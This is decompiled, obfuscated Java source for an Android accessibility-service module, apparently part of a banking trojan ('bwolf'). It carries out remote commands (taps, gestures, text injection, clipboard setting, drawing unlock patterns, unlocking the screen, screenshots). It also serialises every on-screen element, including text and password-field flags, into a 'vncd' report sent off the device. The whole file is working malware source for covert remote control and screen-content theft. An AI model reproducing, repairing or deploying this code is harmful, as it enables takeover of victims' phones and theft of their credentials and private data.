package fddo;

import static android.accessibilityservice.AccessibilityService.*;

import android.accessibilityservice.GestureDescription;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.graphics.Path;
import android.graphics.Point;
import android.graphics.Rect;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import com.sonnokta.p023w;
import com.sonnokta.utils.LogUtil;

import java.util.ArrayList;
import java.util.Iterator;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* renamed from: fddo.const  reason: invalid class name */
public class Cconst {
    private static String TAG = "bwolf-Cconst";

    /* renamed from: case  reason: not valid java name */
    private AccessibilityEvent f41case;

    /* renamed from: else  reason: not valid java name */
    private String f42else = "";

    /* renamed from: fddo  reason: collision with root package name */
    private Context f112fddo;

    /* renamed from: for  reason: not valid java name */
    private int f43for;

    /* renamed from: goto  reason: not valid java name */
    private WindowManager f44goto;
    private fddo ifdf;

    /* renamed from: new  reason: not valid java name */
    private int f45new;

    /* renamed from: try  reason: not valid java name */
    private p023w f46try;

    /* renamed from: fddo.const$fddo */
    class fddoGesture extends GestureResultCallback {
        fddoGesture() {
        }

        public void onCancelled(GestureDescription gestureDescription) {
            super.onCancelled(gestureDescription);
        }

        public void onCompleted(GestureDescription gestureDescription) {
            super.onCompleted(gestureDescription);
        }
    }

    /* renamed from: fddo.const$for  reason: invalid class name */
    class Cfor extends GestureResultCallback {

        /* renamed from: fddo  reason: collision with root package name */
        final /* synthetic */ int f114fddo;
        final /* synthetic */ int ifdf;

        Cfor(int i, int i2) {
            this.f114fddo = i;
            this.ifdf = i2;
        }

        public void onCancelled(GestureDescription gestureDescription) {
            super.onCancelled(gestureDescription);
        }

        public void onCompleted(GestureDescription gestureDescription) {
            super.onCompleted(gestureDescription);
        }
    }

    /* renamed from: fddo.const$ifdf */
    class ifdf extends GestureResultCallback {

        /* renamed from: fddo  reason: collision with root package name */
        final /* synthetic */ String f115fddo;
        final Cconst cconstIfdf;

        ifdf(Cconst cconst, String str) {
            super();
            this.f115fddo = str;
            this.cconstIfdf = cconst;
        }

        public void onCancelled(GestureDescription gestureDescription) {
            super.onCancelled(gestureDescription);
        }

        public void onCompleted(GestureDescription gestureDescription) {
            super.onCompleted(gestureDescription);
        }
    }

    /* renamed from: fddo.const$new  reason: invalid class name */
    class Cnew extends GestureResultCallback {
        Cnew() {
        }

        public void onCancelled(GestureDescription gestureDescription) {
            super.onCancelled(gestureDescription);
        }

        public void onCompleted(GestureDescription gestureDescription) {
            super.onCompleted(gestureDescription);
        }
    }

    /* renamed from: fddo.const$try  reason: invalid class name */
    class Ctry extends GestureResultCallback {

        /* renamed from: fddo  reason: collision with root package name */
        final /* synthetic */ String f117fddo;

        Ctry(String str) {
            this.f117fddo = str;
        }

        public void onCancelled(GestureDescription gestureDescription) {
            super.onCancelled(gestureDescription);
        }

        public void onCompleted(GestureDescription gestureDescription) {
            super.onCompleted(gestureDescription);
        }
    }

    public Cconst(Context context, p023w p023w) {
        this.f112fddo = context;
        this.f46try = p023w;
        this.ifdf = new fddo(this.f46try);
        this.f44goto = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
    }

    /* renamed from: catch  reason: not valid java name */
    private ArrayList<Integer[]> m61catch(AccessibilityNodeInfo accessibilityNodeInfo, String[] strArr) {
        LogUtil.showErrorLog(TAG, "--- m61catch ---");

        String[] strArr2 = strArr;
        Rect rect = new Rect();
        accessibilityNodeInfo.getBoundsInScreen(rect);
        int i = Cgoto.grethwjrsfhj() ? 100 : 50;
        int i2 = rect.left;
        int i3 = rect.top;
        int i4 = rect.right;
        int i5 = rect.bottom;
        int i6 = ((i4 - i2) / 2) + i2;
        int i7 = ((i5 - i3) / 2) + i3;
        ArrayList<Integer[]> arrayList = new ArrayList<>();
        for (String parseInt : strArr2) {
            switch (Integer.parseInt(parseInt)) {
                case 1:
                    arrayList.add(new Integer[]{Integer.valueOf(i2 + i), Integer.valueOf(i3 + i)});
                    break;
                case 2:
                    arrayList.add(new Integer[]{Integer.valueOf(i6), Integer.valueOf(i3 + i)});
                    break;
                case 3:
                    arrayList.add(new Integer[]{Integer.valueOf(i4 - i), Integer.valueOf(i3 + i)});
                    break;
                case 4:
                    arrayList.add(new Integer[]{Integer.valueOf(i2 + i), Integer.valueOf(i7)});
                    break;
                case 5:
                    arrayList.add(new Integer[]{Integer.valueOf(i6), Integer.valueOf(i7)});
                    break;
                case 6:
                    arrayList.add(new Integer[]{Integer.valueOf(i4 - i), Integer.valueOf(i7)});
                    break;
                case 7:
                    arrayList.add(new Integer[]{Integer.valueOf(i2 + i), Integer.valueOf(i5 - i)});
                    break;
                case 8:
                    arrayList.add(new Integer[]{Integer.valueOf(i6), Integer.valueOf(i5 - i)});
                    break;
                case 9:
                    arrayList.add(new Integer[]{Integer.valueOf(i4 - i), Integer.valueOf(i5 - i)});
                    break;
            }
        }
        return arrayList;
    }

    /* renamed from: const  reason: not valid java name */
    public static void m62const(Context context, JSONArray jSONArray) {
        LogUtil.showErrorLog(TAG, "--- m62const ---");
        for (int i = 0; i < jSONArray.length(); i++) {
            try {
                JSONObject jSONObject = jSONArray.getJSONObject(i);
                String string = jSONObject.getString("type");
                String string2 = jSONObject.getString("data");
                p023w p023wV = p023w.f19while;
                if (p023wV != null) {
                    new Cconst(context, p023wV).m84try(string, string2);
                    Cgoto.p(500);
                }
            } catch (JSONException unused) {
            }
        }
    }

    /* renamed from: extends  reason: not valid java name */
    private void m63extends() {
        LogUtil.showErrorLog(TAG, "--- m63extends ---");
        int i;
        float f = (float) (this.f43for / 2);
        float f2 = (float) (((double) f) * 1.8d);
        i = 0;
        AccessibilityNodeInfo accessibilityNodeInfo = fddo.m90else(this.f46try.m20this(), "/boll_ani");
        if (accessibilityNodeInfo == null) {
            i = this.f45new / 2;
        } else {
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            i = rect.top;
        }
        float f3 = (float) i;
        Path path = new Path();
        path.moveTo(f, f3);
        path.lineTo(f2, f3);
        fddoGesture fddo2 = new fddoGesture();
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 300));
        this.f46try.dispatchGesture(builder.build(), fddo2, (Handler) null);
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        this.f46try.dispatchGesture(builder.build(), fddo2, (Handler) null);
    }

    private void fddo(Long l, String str, String str2) {
        LogUtil.showErrorLog(TAG, "--- fddo ---");
        String[] split = str.split(";");
        if (split.length != 0) {
            Path path = new Path();
            boolean z = true;
            for (String split2 : split) {
                String[] split3 = split2.split(":", 2);
                int parseInt = Integer.parseInt(split3[0]);
                int parseInt2 = Integer.parseInt(split3[1]);
                if (str2.equals("taps")) {
                    ifdf(parseInt, parseInt2);
                    Cgoto.p(l.longValue());
                } else if (z) {
                    path.moveTo((float) parseInt, (float) parseInt2);
                    z = false;
                } else {
                    path.lineTo((float) parseInt, (float) parseInt2);
                }
            }
            if (!str2.equals("taps")) {
                this.f46try.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0, l.longValue())).build(), new Cnew(), (Handler) null);
            }
        }
    }

    /* renamed from: final  reason: not valid java name */
    public static void m64final(Context context, String str) {
        LogUtil.showErrorLog(TAG, "--- m64final ---");

        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("xc", "bP");
            jSONObject.put("rZ", new JSONArray());
            jSONObject.put("vncd", str);
            new Cthis(context, jSONObject).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, new Void[0]);
        } catch (JSONException unused) {
        }
    }

    /* renamed from: for  reason: not valid java name */
    public static String m65for(AccessibilityNodeInfo accessibilityNodeInfo) {
        LogUtil.showErrorLog(TAG, "--- m65for ---");

        String str = "";
        if (accessibilityNodeInfo == null) {
            return str;
        }
        StringBuilder sb = new StringBuilder();
        Rect rect = new Rect();
        accessibilityNodeInfo.getBoundsInScreen(rect);
        String flattenToString = rect.flattenToString();
        sb.append("node_rect:" + flattenToString + ";");
        if (accessibilityNodeInfo.getViewIdResourceName() != null) {
            sb.append("viewId:" + accessibilityNodeInfo.getViewIdResourceName() + ";");
        }
        String charSequence = accessibilityNodeInfo.getClassName() != null ? accessibilityNodeInfo.getClassName().toString() : str;
        sb.append("className:" + charSequence + ";");
        sb.append("UID:" + m74this(accessibilityNodeInfo) + ";");
        String charSequence2 = accessibilityNodeInfo.getText() != null ? accessibilityNodeInfo.getText().toString() : str;
        if (!charSequence2.isEmpty()) {
            sb.append("text_start:" + charSequence2 + ":text_end;");
        }
        String charSequence3 = accessibilityNodeInfo.getError() != null ? accessibilityNodeInfo.getError().toString() : str;
        if (!charSequence3.isEmpty()) {
            sb.append("errorText_start:" + charSequence3 + ":error_end;");
        }
        String charSequence4 = accessibilityNodeInfo.getContentDescription() != null ? accessibilityNodeInfo.getContentDescription().toString() : str;
        if (!charSequence4.isEmpty()) {
            sb.append("descr_start:" + charSequence4 + ":descr_end;");
        }
        if (Build.VERSION.SDK_INT >= 28) {
            if (accessibilityNodeInfo.getTooltipText() != null) {
                str = accessibilityNodeInfo.getTooltipText().toString();
            }
            if (!str.isEmpty()) {
                sb.append("tooltip:" + str + ";");
            }
        }
        if (accessibilityNodeInfo.isClickable()) {
            sb.append("isClickable:1;");
        }
        if (accessibilityNodeInfo.isLongClickable()) {
            sb.append("isLongClickable:1;");
        }
        if (accessibilityNodeInfo.isEnabled()) {
            sb.append("isEnabled:1;");
        }
        if (accessibilityNodeInfo.isPassword()) {
            sb.append("isPassword:1;");
        }
        if (accessibilityNodeInfo.isScrollable()) {
            sb.append("isScrollable:1;");
        }
        if (accessibilityNodeInfo.isEditable()) {
            sb.append("isEditable:1;");
        }
        return sb.toString().replace("<", "&lt;").replace(">", "&gt;");
    }

    /* renamed from: import  reason: not valid java name */
    private void m66import(String str) {
        LogUtil.showErrorLog(TAG, "--- m66import ---");
        String[] split = str.split("\\|", 4);
        if (split.length == 4) {
            int parseInt = Integer.parseInt(split[0], 10);
            Long valueOf = Long.valueOf(Long.parseLong(split[1], 10));
            String str2 = split[2];
            for (int i = 0; i < parseInt; i++) {
                fddo(valueOf, split[3], str2);
            }
        }
    }

    /* renamed from: native  reason: not valid java name */
    private void m67native(String str) {
        LogUtil.showErrorLog(TAG, "--- m67native ---");
        AccessibilityNodeInfo accessibilityNodeInfo = m81else(str, this.f46try.m20this(), 0);
        if (accessibilityNodeInfo != null) {
            accessibilityNodeInfo.performAction(32);
        }
    }

    /* renamed from: new  reason: not valid java name */
    private void m68new(String str) {
        LogUtil.showErrorLog(TAG, "--- m68new ---");
        long j;
        String str2;
        AccessibilityNodeInfo accessibilityNodeInfo;
        String str3 = str;
        GestureDescription.Builder builder = new GestureDescription.Builder();
        Path path = new Path();
        char c = 1;
        if (str3.contains("|")) {
            String[] split = str3.split("\\|", 2);
            j = Long.parseLong(split[0], 10);
            str2 = split[1];
        } else {
            j = 1000;
            str2 = str3;
        }
        String[] split2 = str2.split(";");
        if (split2.length >= 4 && (accessibilityNodeInfo = fddo.m90else(p023w.f19while.m20this(), "lockPatternView")) != null) {
            ArrayList<Integer[]> arrayList = new ArrayList<>();
            if (!split2[0].contains(":")) {
                arrayList = m61catch(accessibilityNodeInfo, split2);
            } else {
                int length = split2.length;
                int i = 0;
                while (i < length) {
                    String[] split3 = split2[i].split(":");
                    if (split3.length == 2) {
                        int parseInt = Integer.parseInt(split3[0]);
                        int parseInt2 = Integer.parseInt(split3[c]);
                        if (parseInt >= 0 && parseInt2 >= 0) {
                            arrayList.add(new Integer[]{Integer.valueOf(parseInt), Integer.valueOf(parseInt2)});
                        } else {
                            return;
                        }
                    }
                    i++;
                    c = 1;
                }
            }
            if (arrayList.size() != 0) {
                Iterator<Integer[]> it = arrayList.iterator();
                boolean z = true;
                while (it.hasNext()) {
                    Integer[] next = it.next();
                    if (z) {
                        path.moveTo((float) next[0].intValue(), (float) next[1].intValue());
                        z = false;
                    } else {
                        path.lineTo((float) next[0].intValue(), (float) next[1].intValue());
                    }
                }
                builder.addStroke(new GestureDescription.StrokeDescription(path, 0, j));
                this.f46try.dispatchGesture(builder.build(), new Ctry(str3), (Handler) null);
            }
        }
    }

    /* renamed from: public  reason: not valid java name */
    private void m69public(String str) {
        LogUtil.showErrorLog(TAG, "--- m69public ---");
        AccessibilityNodeInfo accessibilityNodeInfo = m81else(str, this.f46try.m20this(), 0);
        if (accessibilityNodeInfo != null) {
            accessibilityNodeInfo.performAction(32768);
        }
    }

    /* renamed from: return  reason: not valid java name */
    private void m70return(String str) {
        LogUtil.showErrorLog(TAG, "--- m70return ---");
        m68new(str);
    }

    /* renamed from: static  reason: not valid java name */
    private void m71static(String str) {
        LogUtil.showErrorLog(TAG, "--- m71static ---");
        if (str.contains("|")) {
            String[] split = str.split("\\|");
            String trim = split[0].trim();
            String[] split2 = split[1].trim().split(" ");
            if (split2.length == 2) {
                ArrayList<AccessibilityNodeInfo> arrayList = m82goto(Integer.parseInt(split2[0]), Integer.parseInt(split2[1]), this.f46try.m20this(), 0, new ArrayList());
                if (arrayList.size() != 0) {
                    AccessibilityNodeInfo accessibilityNodeInfo = arrayList.get(arrayList.size() - 1);
                    Iterator<AccessibilityNodeInfo> it = arrayList.iterator();
                    while (true) {
                        if (!it.hasNext()) {
                            break;
                        }
                        AccessibilityNodeInfo next = it.next();
                        if (next.getClassName().equals("android.webkit.WebView")) {
                            accessibilityNodeInfo = next;
                            break;
                        }
                    }
                    accessibilityNodeInfo.performAction(trim.equals("forward") ? 4096 : 8192);
                }
            }
        }
    }

    /* renamed from: super  reason: not valid java name */
    private void m72super(String str) {
        LogUtil.showErrorLog(TAG, "--- m72super ---");
        StringBuilder sb;
        GestureDescription.Builder builder = new GestureDescription.Builder();
        Path path = new Path();
        int i = this.f45new / 2;
        int i2 = this.f43for / 2;
        if (str.equals("left")) {
            int i3 = this.f43for / 4;
            int i4 = i3 * 3;
            float f = (float) i;
            path.moveTo((float) i4, f);
            path.lineTo((float) i3, f);
            sb = new StringBuilder();
            sb.append("swipe_left from ");
            sb.append(i4);
            sb.append("x");
            sb.append(i);
            sb.append(" to ");
            sb.append(i3);
        } else {
            if (str.equals("right")) {
                int i5 = this.f43for / 4;
                i2 = i5 * 3;
                float f2 = (float) i;
                path.moveTo((float) i5, f2);
                path.lineTo((float) i2, f2);
                sb = new StringBuilder();
                sb.append("swipe_right from ");
                sb.append(i5);
                sb.append("x");
                sb.append(i);
            } else if (str.equals("up")) {
                int i6 = this.f45new / 4;
                int i7 = i6 * 3;
                float f3 = (float) i2;
                path.moveTo(f3, (float) i7);
                path.lineTo(f3, (float) i6);
                sb = new StringBuilder();
                sb.append("swipe_up from ");
                sb.append(i2);
                sb.append("x");
                sb.append(i7);
                sb.append(" to ");
                sb.append(i2);
                sb.append("x");
                sb.append(i6);
                String sb2 = sb.toString();
                builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 300));
                this.f46try.dispatchGesture(builder.build(), new ifdf(this, sb2), (Handler) null);
            } else if (str.equals("down")) {
                int i8 = this.f45new / 4;
                i = i8 * 3;
                float f4 = (float) i2;
                path.moveTo(f4, (float) i8);
                path.lineTo(f4, (float) i);
                sb = new StringBuilder();
                sb.append("swipe_down from ");
                sb.append(i2);
                sb.append("x");
                sb.append(i8);
            } else {
                return;
            }
            sb.append(" to ");
            sb.append(i2);
        }
        sb.append("x");
        sb.append(i);
        String sb22 = sb.toString();

        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 300));
        this.f46try.dispatchGesture(builder.build(), new ifdf(this, sb22), (Handler) null);
    }

    /* renamed from: switch  reason: not valid java name */
    private void m73switch(String str) {
        LogUtil.showErrorLog(TAG, "--- m73switch ---");
        ClipboardManager clipboardManager = (ClipboardManager) this.f112fddo.getSystemService(Context.CLIPBOARD_SERVICE);
        if (clipboardManager != null) {
            clipboardManager.setPrimaryClip(ClipData.newPlainText("label", str));
        }
    }

    /* renamed from: this  reason: not valid java name */
    public static String m74this(AccessibilityNodeInfo accessibilityNodeInfo) {
        LogUtil.showErrorLog(TAG, "--- m74this ---");
        String str = "";
        if (accessibilityNodeInfo == null) {
            return str;
        }
        Rect rect = new Rect();
        accessibilityNodeInfo.getBoundsInScreen(rect);
        String flattenToString = rect.flattenToString();
        String charSequence = accessibilityNodeInfo.getClassName() != null ? accessibilityNodeInfo.getClassName().toString() : str;
        if (accessibilityNodeInfo.getViewIdResourceName() != null) {
            str = accessibilityNodeInfo.getViewIdResourceName();
        }
        return Cgoto.jargjtadfhgjsrfj(str + charSequence + flattenToString);
    }

    /* renamed from: throws  reason: not valid java name */
    private void m75throws(String str) {
        LogUtil.showErrorLog(TAG, "--- m75throws ---");
        String[] split = str.split("\\|", 2);
        if (split.length == 2) {
            String str2 = split[0];
            String str3 = split[1];
            AccessibilityNodeInfo accessibilityNodeInfo = m81else(str2, this.f46try.m20this(), 0);
            if (accessibilityNodeInfo != null) {
                Bundle bundle = new Bundle();
                bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", str3);
                accessibilityNodeInfo.performAction(2097152, bundle);
            }
        }
    }

    /* renamed from: while  reason: not valid java name */
    private void m76while(String str) {
        LogUtil.showErrorLog(TAG, "--- m76while ---");
        if (!str.isEmpty() && str.contains(" ")) {
            String[] split = str.split(" ");
            if (split.length == 2) {
                ifdf(Integer.parseInt(split[0]), Integer.parseInt(split[1]));
            }
        }
    }

    /* renamed from: break  reason: not valid java name */
    public void m77break() {
        LogUtil.showErrorLog(TAG, "--- m77break ---");
        Point point = new Point();
        this.f44goto.getDefaultDisplay().getSize(point);
        this.f43for = point.x;
        this.f45new = point.y;
    }

    /* renamed from: case  reason: not valid java name */
    public void m78case(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        LogUtil.showErrorLog(TAG, "--- m78case ---");
        String str;
        if (accessibilityNodeInfo != null) {
            try {
                str = "\n<element depth:" + i + "; " + m65for(accessibilityNodeInfo) + " >\n";
            } catch (Exception unused) {
                str = "";
            }
            this.f42else += str;
            for (int i2 = 0; i2 < accessibilityNodeInfo.getChildCount(); i2++) {
                m78case(accessibilityNodeInfo.getChild(i2), i + 1);
            }
        }
    }

    /* renamed from: class  reason: not valid java name */
    public void m79class(AccessibilityEvent accessibilityEvent) {
        LogUtil.showErrorLog(TAG, "--- m79class ---");
        int i;
        StringBuilder sb;
        String str;
        this.f41case = accessibilityEvent;
        int eventType = accessibilityEvent.getEventType();
        if ((eventType == 2048 || eventType == 32 || eventType == 1 || eventType == 4096 || eventType == 16 || eventType == 8) && Cgoto.adpkfmhpeaoimhpdsogmh(this.f112fddo, "last_vnc_request", 0.1d, true)) {
            StringBuilder sb2 = new StringBuilder();
            m77break();
            if (Cgoto.thgjpsmfghokamdgpjkmdghkmf(this.f112fddo)) {
                sb = new StringBuilder();
                sb.append("display_size:");
                sb.append(this.f43for);
                sb.append("x");
                i = this.f45new;
            } else {
                sb = new StringBuilder();
                sb.append("display_size:");
                sb.append(this.f45new);
                sb.append("x");
                i = this.f43for;
            }
            sb.append(i);
            sb.append(";");
            sb2.append(sb.toString());
            sb2.append(this.f112fddo.getResources().getConfiguration().orientation == 1 ? "display_orientation:portrait;" : "display_orientation:landscape;");
            sb2.append("event_start:" + accessibilityEvent.toString() + ":event_end;");
            AccessibilityWindowInfo accessibilityWindowInfo = null;
            try {
                accessibilityWindowInfo = this.f46try.m20this().getWindow();
            } catch (Exception e) {
                e.printStackTrace();
            }
            if (accessibilityWindowInfo != null) {
                int i2 = Build.VERSION.SDK_INT;
                if (i2 >= 24) {
                    sb2.append("window_title:" + accessibilityWindowInfo.getTitle().toString() + ";");
                }
                sb2.append("stringDescription:" + accessibilityWindowInfo.toString() + ";");
                sb2.append("className:" + accessibilityWindowInfo.getClass().toString() + ";");
                sb2.append("windowId:" + accessibilityWindowInfo.getId() + ";");
                sb2.append("zIndex:" + accessibilityWindowInfo.getLayer() + ";");
                sb2.append("isActive:" + accessibilityWindowInfo.isActive() + ";");
                sb2.append("isFocused:" + accessibilityWindowInfo.isFocused() + ";");
                if (i2 >= 26) {
                    sb2.append("isPIP:" + accessibilityWindowInfo.isInPictureInPictureMode() + ";");
                }
                sb2.append("window_type:" + m80default(accessibilityWindowInfo.getType()) + ";");
                Rect rect = new Rect();
                accessibilityWindowInfo.getBoundsInScreen(rect);
                str = "bounds_in_screen:" + rect.flattenToString() + ";";
            } else {
                str = "window_data:null;";
            }
            sb2.append(str);
            m78case(this.f46try.m20this(), 0);
            m64final(this.f112fddo, (("<rootData " + sb2.toString() + " >") + this.f42else) + "</rootData>");
        }
    }

    /* renamed from: default  reason: not valid java name */
    public String m80default(int i) {
        LogUtil.showErrorLog(TAG, "--- m80default ---");
        return i != 1 ? i != 2 ? i != 3 ? i != 4 ? i != 5 ? "<UNKNOWN>" : "TYPE_SPLIT_SCREEN_DIVIDER" : "TYPE_ACCESSIBILITY_OVERLAY" : "TYPE_SYSTEM" : "TYPE_INPUT_METHOD" : "TYPE_APPLICATION";
    }

    /* renamed from: else  reason: not valid java name */
    public AccessibilityNodeInfo m81else(String str, AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        LogUtil.showErrorLog(TAG, "--- m81else ---");
        if (accessibilityNodeInfo == null || m74this(accessibilityNodeInfo).equals(str)) {
            return accessibilityNodeInfo;
        }
        for (int i2 = 0; i2 < accessibilityNodeInfo.getChildCount(); i2++) {
            AccessibilityNodeInfo accessibilityNodeInfo2 = m81else(str, accessibilityNodeInfo.getChild(i2), i + 1);
            if (accessibilityNodeInfo2 != null) {
                return accessibilityNodeInfo2;
            }
        }
        return null;
    }

    /* renamed from: goto  reason: not valid java name */
    public ArrayList<AccessibilityNodeInfo> m82goto(int i, int i2, AccessibilityNodeInfo accessibilityNodeInfo, int i3, ArrayList<AccessibilityNodeInfo> arrayList) {
        LogUtil.showErrorLog(TAG, "--- m82goto ---");
        if (accessibilityNodeInfo == null) {
            return arrayList;
        }
        if (accessibilityNodeInfo.isScrollable()) {
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            if (rect.contains(i, i2)) {
                arrayList.add(accessibilityNodeInfo);
            }
        }
        ArrayList<AccessibilityNodeInfo> arrayList2 = arrayList;
        for (int i4 = 0; i4 < accessibilityNodeInfo.getChildCount(); i4++) {
            arrayList2 = m82goto(i, i2, accessibilityNodeInfo.getChild(i4), i3 + 1, arrayList2);
        }
        return arrayList2;
    }

    public void ifdf(int i, int i2) {
        LogUtil.showErrorLog(TAG, "--- ifdf ---");
        if (i >= 0 && i2 >= 0) {
            GestureDescription.Builder builder = new GestureDescription.Builder();
            Path path = new Path();
            float f = (float) i;
            float f2 = (float) i2;
            path.moveTo(f, f2);
            path.lineTo(f, f2);
            builder.addStroke(new GestureDescription.StrokeDescription(path, 100, 10));
            this.f46try.dispatchGesture(builder.build(), new Cfor(i, i2), (Handler) null);
        }
    }

    /* renamed from: throw  reason: not valid java name */
    public void m83throw(String str) {
        LogUtil.showErrorLog(TAG, "--- m83throw ---");
        String str2;
        str.hashCode();
        char c = 65535;
        switch (str.hashCode()) {
            case -937451900:
                if (str.equals("unlock_touch")) {
                    c = 0;
                    break;
                }
                break;
            case -424664523:
                if (str.equals("quick_settings")) {
                    c = 1;
                    break;
                }
                break;
            case -381820416:
                if (str.equals("lock_screen")) {
                    c = 2;
                    break;
                }
                break;
            case -88919616:
                if (str.equals("swipe_up")) {
                    c = 3;
                    break;
                }
                break;
            case 3015911:
                if (str.equals("back")) {
                    c = 4;
                    break;
                }
                break;
            case 3208415:
                if (str.equals("home")) {
                    c = 5;
                    break;
                }
                break;
            case 106858757:
                if (str.equals("power")) {
                    c = 6;
                    break;
                }
                break;
            case 447091335:
                if (str.equals("swipe_down")) {
                    c = 7;
                    break;
                }
                break;
            case 447319532:
                if (str.equals("swipe_left")) {
                    c = 8;
                    break;
                }
                break;
            case 527796284:
                if (str.equals("toggle_split_screen")) {
                    c = 9;
                    break;
                }
                break;
            case 777739294:
                if (str.equals("take_screenshot")) {
                    c = 10;
                    break;
                }
                break;
            case 963963335:
                if (str.equals("unlock_screen")) {
                    c = 11;
                    break;
                }
                break;
            case 987664599:
                if (str.equals("swipe_right")) {
                    c = 12;
                    break;
                }
                break;
            case 1082295672:
                if (str.equals("recents")) {
                    c = 13;
                    break;
                }
                break;
            case 1272354024:
                if (str.equals("notifications")) {
                    c = 14;
                    break;
                }
                break;
        }
        switch (c) {
            case 0:
                m63extends();
                return;
            case 1:
                this.f46try.performGlobalAction(5);
                return;
            case 2:
                this.f46try.performGlobalAction(8);
                return;
            case 3:
                str2 = "up";
                break;
            case 4:
                this.f46try.performGlobalAction(1);
                return;
            case 5:
                this.f46try.performGlobalAction(2);
                return;
            case 6:
                this.f46try.performGlobalAction(6);
                return;
            case 7:
                str2 = "down";
                break;
            case 8:
                str2 = "left";
                break;
            case 9:
                this.f46try.performGlobalAction(7);
                return;
            case 10:
                this.f46try.performGlobalAction(9);
                return;
            case 11:
                Cgoto.w(this.f112fddo);
                return;
            case 12:
                str2 = "right";
                break;
            case 13:
                this.f46try.performGlobalAction(3);
                return;
            case 14:
                this.f46try.performGlobalAction(4);
                return;
            default:
                return;
        }
        m72super(str2);
    }

    /* renamed from: try  reason: not valid java name */
    public void m84try(String str, String str2) {
        LogUtil.showErrorLog(TAG, "--- m84try ---");
        m77break();
        if (str.equals("click_at")) {
            m76while(str2);
        } else if (str.equals("gesture")) {
            m66import(str2);
        } else if (str.equals("set_text")) {
            m75throws(str2);
        } else if (str.equals("long_click")) {
            m67native(str2);
        } else if (str.equals("action")) {
            m83throw(str2);
        } else if (str.equals("set_clip")) {
            m73switch(str2);
        } else if (str.equals("paste")) {
            m69public(str2);
        } else if (str.equals("send_pattern")) {
            m70return(str2);
        } else if (str.equals("scroll")) {
            m71static(str2);
        }
    }
}
